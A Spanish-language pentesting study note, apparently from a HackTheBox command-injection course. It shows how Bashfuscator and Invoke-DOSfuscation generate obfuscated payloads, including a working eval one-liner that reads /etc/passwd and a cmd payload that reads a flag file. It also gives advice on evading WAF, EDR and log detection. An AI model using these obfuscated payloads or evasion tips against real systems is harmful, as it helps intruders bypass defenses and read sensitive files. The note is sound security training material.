---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Command-Injection
Descripción: "Componer a mano las capas de ofuscación es lento y propenso a error"
Fecha de actualización: 2026-06-13
Nota previa: "[[07 - Ofuscación avanzada de comandos]]"
Nota siguiente: "[[09 - Prevención de Command Injection]]"
Area: "[[Command Injection.base|Command Injection]]"
---
---

Componer a mano las capas de [[07 - Ofuscación avanzada de comandos|ofuscación]] es lento y propenso a error. Cuando enfrentas defensas serias o necesitas iterar rápido, conviene automatizar la generación del payload ofuscado. <mark style="background: #ADCCFFA6;">Estas herramientas aplican y encadenan decenas de técnicas de transformación sobre un comando</mark>, produciendo variantes que a mano costaría horas. Las dos referencias clásicas son `Bashfuscator` (Linux) e `Invoke-DOSfuscation` (Windows).

# Bashfuscator (Linux)

`Bashfuscator` es un framework modular de ofuscación de comandos `bash`. Se clona e instala desde GitHub:

```shell-session
$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ pip3 install setuptools==65
$ python3 setup.py install --user
```

El uso más simple es pasarle el comando con `-c`:

```shell-session
$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload size: 1664 characters
```

> [!warning]+ El tamaño se dispara
> Sin acotar, `Bashfuscator` elige técnicas al azar y <mark style="background: #FFB8EBA6;">puede generar payloads de cientos de miles —hasta un millón— de caracteres</mark>. Eso es inviable en un parámetro web: choca con límites de longitud de la petición, del campo o del propio comando. Hay que forzar algo corto con flags:

```shell-session
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

`-s 1` baja la fuerza, `-t 1` limita el tiempo, `--layers 1` aplica una sola capa y `--no-mangling` evita transformaciones que inflan. El resultado (104 caracteres) sí es inyectable. Siempre conviene probarlo antes con `bash -c '...'` para confirmar que ejecuta el comando original. <mark style="background: #8000E1A6;">El payload no se parece en nada al comando, pero produce el mismo resultado</mark>.

# Invoke-DOSfuscation (Windows)

El equivalente para Windows es `Invoke-DOSfuscation`, de Daniel Bohannon. A diferencia de Bashfuscator, es **interactivo**: se carga el módulo y se navega por menús.

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu...flag.%TMP:~-13,-12%xt
```

El payload resultante usa intensivamente la [[05 - Bypass de caracteres en blacklist|sustitución por substring de variables de entorno]] (`%TEMP:~-3,-2%`) que ya vimos a mano. Funciona directamente en `cmd.exe`.

> [!info]+ Sin Windows a mano
> `Invoke-DOSfuscation` corre en Linux a través de `pwsh` (PowerShell Core), preinstalado en la `Pwnbox` de HTB. Para PowerShell puro —no `cmd`—, la herramienta hermana es `Invoke-Obfuscation`, del mismo autor, el estándar para ofuscar scripts y one-liners de PowerShell.

# El límite que HTB no menciona: estas firmas ya se conocen

Aquí está la actualización crítica, porque el módulo tiene años. <mark style="background: #FFB86CA6;">`Bashfuscator`, `Invoke-DOSfuscation` e `Invoke-Obfuscation` son herramientas públicas y muy usadas desde ~2017-2018</mark>, así que sus patrones de salida están perfectamente catalogados:

- Los **WAF con ML** y los **EDR** modernos reconocen el "estilo" de un payload de Bashfuscator —su entropía, el uso masivo de `${W0[...]}`, `eval "$(...)"`— aunque cada ejecución sea distinta.
- `Invoke-Obfuscation` es probablemente el patrón de PowerShell ofuscado **más perseguido** por los SOC; Microsoft Defender lo detecta por firma.

<mark style="background: #FF5582A6;">Para bug bounty real, la ofuscación automática de catálogo es un punto de partida, no la bala de plata</mark>. Lo que de verdad evade defensas actualizadas es la transformación **artesanal y única** de la nota anterior, posiblemente combinando varias capas propias. Usa estas herramientas para entender las técnicas y para objetivos con defensas modestas; contra un WAF/EDR puntero, escribe tu propio payload.

> [!warning]+ Ruido y OPSEC
> Igual que con `base64 | bash`, un payload masivamente ofuscado es muy llamativo en los logs. Un comando de 100 KB o un `eval` con entropía altísima grita "ataque" a cualquier analista. Pesa el [[07 - Ofuscación avanzada de comandos|coste de detección]] frente al beneficio antes de lanzarlo en un entorno monitorizado.

> [!info]+ Fuentes y repos
> - [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) (Linux)
> - [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) · [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) (Windows, Daniel Bohannon)
> - [DOSfuscation paper (Bohannon)](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf) — la teoría detrás de la ofuscación de `cmd`.

El arsenal completo —no solo de ofuscación, sino de detección, explotación y registro— se recopila en la [[10 - Arsenal de herramientas para Command Injection|última nota]]. Antes, el lado defensivo: cómo se previene de raíz una command injection. [[09 - Prevención de Command Injection]].
